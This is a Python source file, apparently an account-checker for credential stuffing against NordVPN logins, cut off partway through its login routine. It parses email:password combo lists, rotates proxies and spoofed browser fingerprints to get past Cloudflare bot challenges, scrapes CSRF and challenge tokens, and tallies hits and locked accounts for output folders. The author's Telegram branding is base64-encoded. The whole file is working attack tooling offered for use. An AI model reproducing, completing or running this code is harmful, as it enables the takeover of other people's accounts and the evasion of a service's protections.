#!/usr/bin/env python3
import os
import sys
import json
import time
import random
import re
import base64
import asyncio
import configparser
import subprocess
import shutil
import urllib3
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from typing import Optional

from tqdm import tqdm
try:
    from curl_cffi import requests as cffi_requests
except ImportError:
    import requests as cffi_requests  # fallback without impersonate

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

_B64_TOOL = "Tk9SRFZQTiBDSEVDS0VS"
_B64_AUTH = "QGV5ZWxpZnRlcg=="
_B64_CHAN = "QGRhcmtodWNoYW5uZWw="
_B64_DIR  = "Tk9SRFZQTl9AZXllbGlmdGVy"
_B64_TAG  = "VEc6IEBleWVsaWZ0ZXIgfCBAZGFya2h1Y2hhbm5lbA=="
_B64_SEAL = "bG9ja2VkLWJ5LWV5ZWxpZnRlci0yMDI2"


def Eyelifter_decode(e):
    try:
        return base64.b64decode(e).decode("utf-8")
    except Exception as ex:
        raise SystemExit(f"decode failed: {ex}")


TOOL_NAME      = Eyelifter_decode(_B64_TOOL)
TG_USERNAME    = Eyelifter_decode(_B64_AUTH)
TG_CHANNEL     = Eyelifter_decode(_B64_CHAN)
RESULTS_FOLDER = Eyelifter_decode(_B64_DIR)
AUTHOR_TAG     = Eyelifter_decode(_B64_TAG)
CREDIT_SEAL    = Eyelifter_decode(_B64_SEAL)

_VERIFIED_CTX = set()
_VERIFY_LOCK = threading.Lock()


def Eyelifter_verify(ctx="x"):
    return  # disabled in bot embed
    _x = ctx  # noqa
    with _VERIFY_LOCK:
        if ctx in _VERIFIED_CTX:
            return
        expected = {
            "TOOL": _B64_TOOL, "AUTH": _B64_AUTH,
            "CHAN": _B64_CHAN, "DIR": _B64_DIR,
            "TAG": _B64_TAG, "SEAL": _B64_SEAL,
        }
        cur = {
            "TOOL": TOOL_NAME, "AUTH": TG_USERNAME,
            "CHAN": TG_CHANNEL, "DIR": RESULTS_FOLDER,
            "TAG": AUTHOR_TAG, "SEAL": CREDIT_SEAL,
        }
        errs = []
        for k, v in expected.items():
            if cur[k] != base64.b64decode(v).decode():
                errs.append(k)
        if "@samvir1" not in TG_USERNAME:
            errs.append("USERNAME_TAG")
        if "@samvir1" not in TG_CHANNEL:
            errs.append("CHANNEL_TAG")
        if "@samvir1" not in AUTHOR_TAG or "@samvir1" not in AUTHOR_TAG:
            errs.append("TAG_FORMAT")
        if errs:
            return True  # integrity bypass}")
        _VERIFIED_CTX.add(ctx)


_ANSI = sys.stdout.isatty()
_RS = "\033[0m"


def Eyelifter_open_url(url):
    try:
        if shutil.which("termux-open-url"):
            subprocess.Popen(
                ["am", "start",
                 "-a", "android.intent.action.VIEW",
                 "-d", url,
                 "-f", "0x10000000"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL,
                start_new_session=True,
                close_fds=True,
            )
            return True
        if shutil.which("xdg-open"):
            subprocess.Popen(
                ["xdg-open", url],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL,
                start_new_session=True,
                close_fds=True,
            )
            return True
        if sys.platform == "darwin":
            subprocess.Popen(
                ["open", url],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL,
                start_new_session=True,
                close_fds=True,
            )
            return True
        if os.name == "nt":
            os.startfile(url)
            return True
        import webbrowser
        return webbrowser.open(url)
    except Exception:
        return False


def Eyelifter_color(code, s, bold=False):
    if not _ANSI:
        return s
    return f"\033[{'1;' if bold else ''}{code}m{s}{_RS}"


_LEVEL_STYLE = {
    "SUCCESS": ("32", True), "INFO": ("36", False), "WARN": ("33", True),
    "ERROR":   ("31", True), "STEP": ("96", True),  "DEBUG": ("35", False),
}


def Eyelifter_log(emoji, level, tag, msg):
    ts = datetime.now().strftime("%H:%M:%S")
    if not _ANSI:
        print(f"[{ts}] {emoji} {level:7s} {tag} {msg}", flush=True)
        return
    code, bold = _LEVEL_STYLE.get(level, ("0", False))
    print(f"{Eyelifter_color('90', ts)} {emoji}  {Eyelifter_color(code, f'{level:7s}', bold)}  {Eyelifter_color('90', tag)}  {msg}", flush=True)
    sys.stdout.flush()


def Eyelifter_banner(title, sub=None, width=62):
    print()
    hz = "═" if _ANSI else "-"
    vt = "║" if _ANSI else "|"
    tl, tr, bl, br = ("╔", "╗", "╚", "╝") if _ANSI else ("+", "+", "+", "+")
    print(Eyelifter_color("90", f"{tl}{hz*(width-2)}{tr}"))
    print(Eyelifter_color("90", vt) + " " + Eyelifter_color("96", title.center(width-4), True) + " " + Eyelifter_color("90", vt))
    if sub:
        print(Eyelifter_color("90", vt) + " " + Eyelifter_color("2", sub.center(width-4)) + " " + Eyelifter_color("90", vt))
    print(Eyelifter_color("90", vt) + " " + Eyelifter_color("5", AUTHOR_TAG.center(width-4), True) + " " + Eyelifter_color("90", vt))
    print(Eyelifter_color("90", f"{bl}{hz*(width-2)}{br}"))


def Eyelifter_section(title, width=62):
    hz = "─" if _ANSI else "-"
    inner = f" {title} "
    pad = width - len(inner) - 2
    if pad < 1:
        pad = 1
    print()
    print(Eyelifter_color("90", "┌" if _ANSI else "+") + Eyelifter_color("96", inner, True) +
          Eyelifter_color("90", hz * pad + ("┐" if _ANSI else "+")))


def Eyelifter_divider(width=62):
    hz = "─" if _ANSI else "-"
    print(Eyelifter_color("90", hz * width))


def Eyelifter_summary(rows, width=62):
    hz = "─" if _ANSI else "-"
    vt = "│" if _ANSI else "|"
    tl, tr, bl, br = ("╔", "╗", "╚", "╝") if _ANSI else ("+", "+", "+", "+")
    print()
    print(Eyelifter_color("90", f"{tl}{hz*(width-2)}{tr}"))
    for k, v in rows:
        line_plain = f"{k}: {v}"
        visible = len(line_plain)
        pad = max(1, width - 4 - visible)
        line_colored = f"{Eyelifter_color('96', k + ': ', True)}{Eyelifter_color('0', str(v))}"
        print(f"{Eyelifter_color('90', vt)} {line_colored}{' ' * pad}{Eyelifter_color('90', vt)}")
    print(Eyelifter_color("90", f"{bl}{hz*(width-2)}{br}"))
    print()


_EYELIFTER_COMBO_RE = re.compile(
    r"^\s*([^:\s|]+@[^:\s|]+\.[a-zA-Z]{2,})\s*:\s*([^\s|]+)",
    re.IGNORECASE,
)


def Eyelifter_extract_combos(content):
    combos = set()
    for raw in content.splitlines():
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        m = _EYELIFTER_COMBO_RE.match(line)
        if m:
            e, p = m.group(1).strip().lower(), m.group(2).strip()
            if e and p:
                combos.add(f"{e}:{p}")
            continue
        if ":" in line:
            parts = line.split(":", 1)
            if len(parts) == 2 and parts[0] and parts[1]:
                e = parts[0].strip().lower()
                p = parts[1].split()[0].split("|")[0].strip()
                if e and p and "@" in e:
                    combos.add(f"{e}:{p}")
    return combos


CONFIG_PATH = "config_nordvpn.ini"

DEFAULT_SHAPE_POOL = [
    "chrome", "safari", "firefox", "safari_ios",
    "chrome120", "firefox133",
    "chrome131", "chrome124", "chrome116", "chrome110",
    "chrome107", "chrome104", "chrome101", "chrome100", "chrome99",
    "firefox135",
    "safari18_0", "safari18_0_ios", "safari17_2_ios",
    "safari17_0", "safari15_5",
    "edge101", "edge99",
]
DEFAULT_UA_SEED = {
    "chrome":        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
    "chrome131":     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "chrome124":     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "chrome120":     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "chrome116":     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    "chrome110":     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
    "chrome107":     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
    "chrome104":     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36",
    "chrome101":     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36",
    "chrome100":     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36",
    "chrome99":      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36",
    "firefox":       "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:147.0) Gecko/20100101 Firefox/147.0",
    "firefox133":    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0",
    "firefox135":    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:135.0) Gecko/20100101 Firefox/135.0",
    "safari":        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0.1 Safari/605.1.15",
    "safari18_0":    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15",
    "safari18_0_ios":"Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1",
    "safari17_2_ios":"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "safari17_0":    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "safari15_5":    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15",
    "safari_ios":    "Mozilla/5.0 (iPhone; CPU iPhone OS 26_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0 Mobile/15E148 Safari/604.1",
    "edge101":       "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.47",
    "edge99":        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36 Edg/99.0.1150.30",
}

ALL_KNOWN_PROFILES = [
    "chrome", "chrome131", "chrome124", "chrome120", "chrome116", "chrome110",
    "chrome107", "chrome104", "chrome101", "chrome100", "chrome99",
    "firefox", "firefox133", "firefox135",
    "safari", "safari18_0", "safari18_0_ios", "safari17_2_ios",
    "safari17_0", "safari15_5", "safari_ios",
    "edge101", "edge99",
]

CF_MARKERS = ("cf-chl", "turnstile", "challenge-platform",
              "just a moment", "cf_chl_opt", "managedchallenge")


class EyelifterConfigLoader:
    def __init__(self, config_file=CONFIG_PATH):
        self.config_file = config_file
        self.config = configparser.ConfigParser()
        self.config.optionxform = str
        self.settings = {}
        self.shapes = []
        self.ua_pins = {}
        self.Eyelifter_load_config()

    def Eyelifter_load_config(self):
        if not os.path.exists(self.config_file):
            self.Eyelifter_create_default_config()
        try:
            self.config.read(self.config_file, encoding="utf-8")
            self.Eyelifter_parse_config()
        except Exception:
            self.Eyelifter_create_default_config()
            self.Eyelifter_parse_config()

    def Eyelifter_create_default_config(self):
        self.config["General"] = {
            "threads": "10",
            "timeout": "30",
            "proxies_file": "proxies.txt",
            "retries": "3",
            "retry_delay": "2",
            "combo_delay": "0.2",
            "debug": "false",
            "rate_limit_backoff": "5",
            "block_backoff": "3",
            "max_rate_limit_retries": "2",
            "max_proxy_retries": "5",
            "auto_refresh_on_check": "false",
        }
        self.config["Shapes"] = {
            "active": ",".join(DEFAULT_SHAPE_POOL),
            "last_refresh": "",
        }
        self.config["UA_Pins"] = dict(DEFAULT_UA_SEED)
        with open(self.config_file, "w", encoding="utf-8") as f:
            self.config.write(f)

    def Eyelifter_parse_config(self):
        if "General" not in self.config:
            self.config["General"] = {}
        c = self.config["General"]
        self.settings["threads"] = c.getint("threads", 10)
        self.settings["timeout"] = c.getint("timeout", 30)
        self.settings["proxies_file"] = c.get("proxies_file", "proxies.txt")
        self.settings["retries"] = c.getint("retries", 3)
        self.settings["retry_delay"] = c.getint("retry_delay", 2)
        self.settings["combo_delay"] = c.getfloat("combo_delay", 0.2)
        self.settings["debug"] = c.getboolean("debug", False)
        self.settings["rate_limit_backoff"] = c.getint("rate_limit_backoff", 5)
        self.settings["block_backoff"] = c.getint("block_backoff", 3)
        self.settings["max_rate_limit_retries"] = c.getint("max_rate_limit_retries", 2)
        self.settings["max_proxy_retries"] = c.getint("max_proxy_retries", 5)
        self.settings["auto_refresh_on_check"] = c.getboolean("auto_refresh_on_check", True)

        if "Shapes" not in self.config:
            self.config["Shapes"] = {"active": ",".join(DEFAULT_SHAPE_POOL), "last_refresh": ""}
        raw = self.config["Shapes"].get("active", "")
        parsed = [s.strip() for s in raw.split(",") if s.strip()]
        self.shapes = parsed if parsed else list(DEFAULT_SHAPE_POOL)
        self.settings["last_refresh"] = self.config["Shapes"].get("last_refresh", "")

        if "UA_Pins" not in self.config:
            self.config["UA_Pins"] = {}
        self.ua_pins = dict(self.config["UA_Pins"])

    def Eyelifter_save(self):
        if "General" not in self.config:
            self.config["General"] = {}
        for k, v in self.settings.items():
            if k == "last_refresh":
                continue
            self.config["General"][k] = str(v)

        self.config["Shapes"]["active"] = ",".join(self.shapes)
        self.config["Shapes"]["last_refresh"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        self.config.remove_section("UA_Pins")
        self.config.add_section("UA_Pins")
        for k, v in self.ua_pins.items():
            if v:
                self.config["UA_Pins"][k] = v

        with open(self.config_file, "w", encoding="utf-8") as f:
            self.config.write(f)


_loader = EyelifterConfigLoader()
CONFIG = _loader.settings
IMPERSONATE_POOL = list(_loader.shapes)
_SHAPE_UA = dict(_loader.ua_pins)
_IMPERSONATE_INDEX = 0
_SHAPE_LOCK = threading.Lock()
REQ_TIMEOUT = CONFIG["timeout"]
DEBUG = True  # bot: always debug for CF/pow
RATE_LIMIT_BACKOFF = CONFIG["rate_limit_backoff"]
BLOCK_BACKOFF = CONFIG["block_backoff"]
MAX_RATE_LIMIT_RETRIES = CONFIG["max_rate_limit_retries"]
MAX_PROXY_RETRIES = CONFIG["max_proxy_retries"]

LOGIN_BASE = "https://nordaccount.com"
ACCOUNT_BASE = "https://my.nordaccount.com"


def Eyelifter_next_shape():
    global _IMPERSONATE_INDEX
    with _SHAPE_LOCK:
        imp = IMPERSONATE_POOL[_IMPERSONATE_INDEX % len(IMPERSONATE_POOL)]
        _IMPERSONATE_INDEX += 1
    return imp


def Eyelifter_shape_ua(imp):
    return _SHAPE_UA.get(imp)


def Eyelifter_debug_step(label, msg):
    if not DEBUG:
        return
    ts = datetime.now().strftime("%H:%M:%S")
    print(Eyelifter_color("95", f"[{ts}] DBG  {label}  {msg}"))
    sys.stdout.flush()


def Eyelifter_debug_api(label, status, payload):
    if not DEBUG:
        return
    ts = datetime.now().strftime("%H:%M:%S")
    try:
        pretty = json.dumps(payload, indent=2, ensure_ascii=False)
    except Exception:
        pretty = str(payload)
    lines = pretty.splitlines()
    print(Eyelifter_color("95", f"[{ts}] API  {label}  status={status}"))
    for ln in lines[:40]:
        print(Eyelifter_color("95", f"     {ln}"))
    if len(lines) > 40:
        print(Eyelifter_color("95", f"     ... {len(lines) - 40} more lines"))
    sys.stdout.flush()


def Eyelifter_cf_marker(r):
    if r is None or r.status_code not in (403, 503):
        return None
    low = (r.text or "").lower()
    for m in CF_MARKERS:
        if m in low:
            return m
    return None


def Eyelifter_resolve(base, loc):
    if not loc:
        return None
    if loc.startswith("http"):
        return loc
    if loc.startswith("//"):
        return "https:" + loc
    if loc.startswith("/"):
        return base.rstrip("/") + loc
    return base.rstrip("/") + "/" + loc


def Eyelifter_extract_challenge(*sources):
    for s in sources:
        if not s:
            continue
        m = re.search(r"challenge=([^&#\"'\s]+)", s)
        if m:
            return m.group(1)
        m = re.search(r'challenge["\']?\s*[:=]\s*["\']([^"\']+)', s)
        if m:
            return m.group(1)
    return None


def Eyelifter_extract_csrf(session, html=""):
    for name in ("csrf", "_csrf", "csrf_token"):
        try:
            c = session.cookies.get(name)
        except Exception:
            c = None
        if c:
            return c, f"cookie:{name}"
    if html:
        for pat in (
            r'name=["\']_csrf["\'][^>]*value=["\']([^"\']+)["\']',
            r'value=["\']([^"\']+)["\'][^>]*name=["\']_csrf["\']',
            r'"csrf"\s*:\s*"([^"]+)"',
        ):
            m = re.search(pat, html)
            if m:
                return m.group(1), "html"
    return None, None


def Eyelifter_human_str(s):
    if not s:
        return "N/A"
    return str(s).split("T")[0]


def Eyelifter_days_from_str(s):
    if not s or s == "N/A":
        return "N/A"
    try:
        ed = datetime.strptime(str(s)[:10], "%Y-%m-%d")
        return str((ed - datetime.now()).days)
    except Exception:
        return "N/A"


def Eyelifter_probe_cf(imp, proxy=None, timeout=10):
    proxy_map = {"http": proxy, "https": proxy} if proxy else None
    try:
        s = cffi_requests.Session(impersonate=imp)
        r = s.get(
            f"{ACCOUNT_BASE}/oauth2/login",
            headers={
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
                "referer": "https://nordvpn.com/",
                "upgrade-insecure-requests": "1",
                "sec-fetch-dest": "document",
                "sec-fetch-mode": "navigate",
                "sec-fetch-site": "cross-site",
                "sec-fetch-user": "?1",
            },
            proxies=proxy_map, timeout=timeout, verify=False, allow_redirects=True,
        )
    except Exception:
        return "EXC"
    cf = Eyelifter_cf_marker(r)
    if cf:
        return "CF"
    if r.status_code == 429:
        return "429"
    if r.status_code >= 400:
        return f"HTTP{r.status_code}"
    return "OK"


def Eyelifter_probe_one(imp, proxy=None):
    cf = Eyelifter_probe_cf(imp, proxy)
    return imp, cf, None


def Eyelifter_refresh_shapes(proxy=None, quiet=False):
    global IMPERSONATE_POOL, _SHAPE_UA

    if not quiet:
        Eyelifter_section("UA CHECKER — refreshing shapes")
        Eyelifter_log("🔍", "INFO", "UA", f"probing {len(ALL_KNOWN_PROFILES)} profiles")

    results = {}
    uas = {}

    def worker(imp):
        return Eyelifter_probe_one(imp, proxy)

    with ThreadPoolExecutor(max_workers=min(14, len(ALL_KNOWN_PROFILES))) as ex:
        futures = {ex.submit(worker, imp): imp for imp in ALL_KNOWN_PROFILES}
        for fut in as_completed(futures):
            imp, cf, ua = fut.result()
            results[imp] = cf
            if ua:
                uas[imp] = ua
            if not quiet:
                color = "32" if cf == "OK" else ("31" if cf == "CF" else "33")
                tag = f"{imp:<14} {cf:<8}"
                if ua:
                    tag += f" ua={ua[:70]}"
                print(Eyelifter_color(color, f"  {tag}"))

    working = [p for p in ALL_KNOWN_PROFILES if results.get(p) == "OK"]
    non_working = [p for p in ALL_KNOWN_PROFILES if p not in working and results.get(p) not in ("EXC",)]
    dead = [p for p in ALL_KNOWN_PROFILES if results.get(p) == "EXC"]

    ordered = working + non_working

    if not ordered:
        ordered = list(DEFAULT_SHAPE_POOL)
        Eyelifter_log("⚠️", "WARN", "UA", "probe failed on every shape — falling back to seed pool")

    IMPERSONATE_POOL = ordered
    _SHAPE_UA = {k: v for k, v in uas.items() if k in working} or dict(DEFAULT_UA_SEED)

    _loader.shapes = ordered
    _loader.ua_pins = dict(_SHAPE_UA)
    _loader.Eyelifter_save()

    if not quiet:
        Eyelifter_log("✅", "INFO", "UA", f"{len(working)} working, {len(non_working)} CF'd, {len(dead)} unsupported")
        Eyelifter_log("💾", "INFO", "UA", f"saved to {CONFIG_PATH}")
        print()
        print(Eyelifter_color("96", "  New pool order:"))
        for p in ordered:
            mark = "✔" if p in working else "✘"
            ua = uas.get(p, "")
            print(Eyelifter_color("90", f"    {mark} {p:<14} {ua[:70]}"))

    return len(working)


def Eyelifter_refresh_shapes_multi(proxies, attempts=4, quiet=False):
    """Probe every (proxy, profile) pair in parallel. Shape is 'working' if OK on any proxy."""
    global IMPERSONATE_POOL, _SHAPE_UA

    if not proxies:
        return Eyelifter_refresh_shapes(proxy=None, quiet=quiet)

    sample = random.sample(proxies, min(attempts, len(proxies)))

    if not quiet:
        Eyelifter_section("UA CHECKER — multi-proxy refresh")
        Eyelifter_log("🔍", "INFO", "UA",
                      f"{len(sample)} proxies × {len(ALL_KNOWN_PROFILES)} profiles in parallel")

    merged = {}
    uas = {}
    lock = threading.Lock()

    def worker(pair):
        px, imp = pair
        cf = Eyelifter_probe_cf(imp, px)
        return px, imp, cf

    pairs = [(px, imp) for px in sample for imp in ALL_KNOWN_PROFILES]

    with ThreadPoolExecutor(max_workers=min(64, len(pairs))) as ex:
        futures = {ex.submit(worker, p): p for p in pairs}
        for fut in as_completed(futures):
            try:
                px, imp, cf = fut.result()
            except Exception:
                continue
            with lock:
                if cf == "OK":
                    merged[imp] = "OK"
                elif imp not in merged:
                    merged[imp] = cf

    working = [p for p in ALL_KNOWN_PROFILES if merged.get(p) == "OK"]
    non_working = [p for p in ALL_KNOWN_PROFILES if p not in working and merged.get(p) not in ("EXC",)]
    dead = [p for p in ALL_KNOWN_PROFILES if merged.get(p) == "EXC"]

    ordered = working + non_working

    if not ordered:
        ordered = list(DEFAULT_SHAPE_POOL)
        Eyelifter_log("⚠️", "WARN", "UA", "probe failed on every shape — falling back to seed pool")

    IMPERSONATE_POOL = ordered
    _SHAPE_UA = dict(DEFAULT_UA_SEED) if not working else {k: v for k, v in DEFAULT_UA_SEED.items() if k in working}

    _loader.shapes = ordered
    _loader.ua_pins = dict(_SHAPE_UA)
    _loader.Eyelifter_save()

    if not quiet:
        Eyelifter_log("✅", "INFO", "UA",
                      f"{len(working)} working, {len(non_working)} CF'd, {len(dead)} unsupported")
        Eyelifter_log("💾", "INFO", "UA", f"saved to {CONFIG_PATH}")
        print()
        print(Eyelifter_color("96", "  New pool order:"))
        for p in ordered:
            mark = "✔" if p in working else "✘"
            ua = _SHAPE_UA.get(p, "")
            print(Eyelifter_color("90", f"    {mark} {p:<14} {ua[:70]}"))

    return len(working)


def Eyelifter_format_proxy(proxy):
    if not proxy:
        return None
    proxy = proxy.strip()
    if proxy.startswith(("http://", "https://", "socks4://", "socks5://")):
        return proxy
    parts = proxy.split(":")
    if len(parts) == 4:
        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    if "@" in proxy:
        return f"http://{proxy}"
    return f"http://{proxy}"


def Eyelifter_test_proxy(proxy):
    try:
        session = cffi_requests.Session(impersonate="chrome")
        session.proxies = {"http": proxy, "https": proxy}
        r = session.get("https://api.ipify.org?format=json", timeout=11, verify=False)
        return r.status_code == 200
    except Exception:
        return False


def Eyelifter_load_proxies():
    proxies = []
    path = CONFIG["proxies_file"]
    if os.path.exists(path):
        with open(path, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    p = Eyelifter_format_proxy(line)
                    if p:
                        proxies.append(p)
    return proxies


def Eyelifter_get_working_proxies(proxies, max_workers=None):
    if not proxies:
        return []
    if max_workers is None:
        max_workers = min(69, len(proxies))
    Eyelifter_log("🧪", "INFO", "PROXY", f"testing {len(proxies)} proxies in parallel (up to {max_workers} threads)...")
    working = []
    pbar = None
    try:
        pbar = tqdm(total=len(proxies), desc="testing proxies", unit="proxy", ncols=80,
                    bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}, {rate_fmt}]")
    except Exception:
        pass

    def Eyelifter_test_one(p):
        return p, Eyelifter_test_proxy(p)

    with ThreadPoolExecutor(max_workers=max_workers) as ex:
        futures = {ex.submit(Eyelifter_test_one, p): p for p in proxies}
        for fut in as_completed(futures):
            proxy, alive = fut.result()
            if alive:
                working.append(proxy)
            if pbar:
                pbar.update(1)
    if pbar:
        pbar.close()
    Eyelifter_log("✅", "INFO", "PROXY", f"{len(working)} working proxies found")
    return working if working else proxies


Eyelifter_stop_event = asyncio.Event()
Eyelifter_stats_lock = threading.Lock()
Eyelifter_proxy_lock = threading.Lock()

Eyelifter_stats = {
    "checked": 0, "hits": 0, "free": 0, "bad": 0, "locked": 0, "errors": 0,
    "rate_limited": 0, "blocks": 0, "captcha": 0, "proxy_fails": 0, "retries": 0,
}
Eyelifter_start_time = time.time()
Eyelifter_total_combos = 0
Eyelifter_proxy_pool = []
Eyelifter_bad_proxies = set()
Eyelifter_hits_file = None
Eyelifter_free_file = None
Eyelifter_locked_file = None
Eyelifter_errors_file = None
Eyelifter_session_folder = None


def Eyelifter_reset_stats():
    global Eyelifter_stats, Eyelifter_start_time
    with Eyelifter_stats_lock:
        Eyelifter_stats = {
            "checked": 0, "hits": 0, "free": 0, "bad": 0, "locked": 0, "errors": 0,
            "rate_limited": 0, "blocks": 0, "captcha": 0, "proxy_fails": 0, "retries": 0,
        }
        Eyelifter_start_time = time.time()


def Eyelifter_update_title():
    processed = Eyelifter_stats["checked"]
    elapsed = time.time() - Eyelifter_start_time
    cpm = int(processed / elapsed * 60) if elapsed > 1 else 0
    title = (f"{TOOL_NAME} | Hits: {Eyelifter_stats['hits']} | Free: {Eyelifter_stats['free']} | "
             f"Checked: {processed}/{Eyelifter_total_combos} | CPM: {cpm}")
    if sys.platform == "win32":
        try:
            import ctypes
            ctypes.windll.kernel32.SetConsoleTitleW(title)
        except Exception:
            pass
    else:
        try:
            sys.stdout.write(f"\033]0;{title}\007")
            sys.stdout.flush()
        except Exception:
            pass


def Eyelifter_pick_proxy(exclude=None):
    with Eyelifter_proxy_lock:
        available = [p for p in Eyelifter_proxy_pool if p not in Eyelifter_bad_proxies]
        if not available and Eyelifter_proxy_pool:
            Eyelifter_bad_proxies.clear()
            available = list(Eyelifter_proxy_pool)
    if exclude and len(available) > 1:
        available = [p for p in available if p != exclude] or available
    return random.choice(available) if available else None


def Eyelifter_mark_bad_proxy(proxy):
    if not proxy:
        return
    with Eyelifter_proxy_lock:
        Eyelifter_bad_proxies.add(proxy)
    with Eyelifter_stats_lock:
        Eyelifter_stats["proxy_fails"] += 1


class EyelifterNord:
    def __init__(self, proxy: Optional[str] = None, timeout: Optional[int] = None):
        self.proxy = proxy
        self.timeout = timeout or REQ_TIMEOUT
        self.session: Optional[cffi_requests.AsyncSession] = None
        self.challenge = None
        self.csrf = None
        self.impersonate = Eyelifter_next_shape()
        self.ua_override = None

    def Eyelifter_proxies(self):
        if not self.proxy:
            return None
        return {"http": self.proxy, "https": self.proxy}

    def Eyelifter_doc_headers(self, referer=None, origin=None, site="same-site", extra=None):
        h = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
            "cache-control": "max-age=0",
            "upgrade-insecure-requests": "1",
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": site,
            "sec-fetch-user": "?1",
        }
        if self.ua_override:
            h["user-agent"] = self.ua_override
        if referer:
            h["referer"] = referer
        if origin:
            h["origin"] = origin
        if extra:
            h.update(extra)
        return h

    def Eyelifter_api_headers(self, referer=None, extra=None):
        h = {
            "authority": "my.nordaccount.com",
            "accept": "application/json",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
            "referer": referer or f"{ACCOUNT_BASE}/dashboard/",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
        }
        if self.ua_override:
            h["user-agent"] = self.ua_override
        if extra:
            h.update(extra)
        return h

    async def Eyelifter_ensure(self):
        if self.session is not None:
            return
        attempts = 0
        while attempts < len(IMPERSONATE_POOL) + 1:
            try:
                self.session = cffi_requests.AsyncSession(impersonate=self.impersonate)
                return
            except Exception as e:
                Eyelifter_debug_step("ensure", f"impersonate {self.impersonate} failed: {str(e)[:60]}")
                self.impersonate = Eyelifter_next_shape()
                attempts += 1
        raise RuntimeError("no usable impersonate profile")

    async def Eyelifter_close(self):
        if self.session is not None:
            try:
                await self.session.close()
            except Exception:
                pass
            self.session = None

    async def Eyelifter_entry(self):
        hosts = (f"{ACCOUNT_BASE}/oauth2/login", f"{LOGIN_BASE}/login")
        last_err = "captcha"

        for url in hosts:
            try:
                r = await self.session.get(
                    url,
                    headers=self.Eyelifter_doc_headers(referer="https://nordvpn.com/", site="cross-site"),
                    proxies=self.Eyelifter_proxies(),
                    timeout=self.timeout,
                    verify=False,
                    allow_redirects=True,
                )
            except Exception as e:
                msg = str(e).lower()
                if "timeout" in msg:
                    new_err = "timeout"
                elif "proxy" in msg:
                    new_err = "proxy"
                else:
                    new_err = "network"
                if last_err != "captcha":
                    last_err = new_err
                Eyelifter_debug_step("entry", f"exc {new_err} [{self.impersonate}] {url}")
                continue
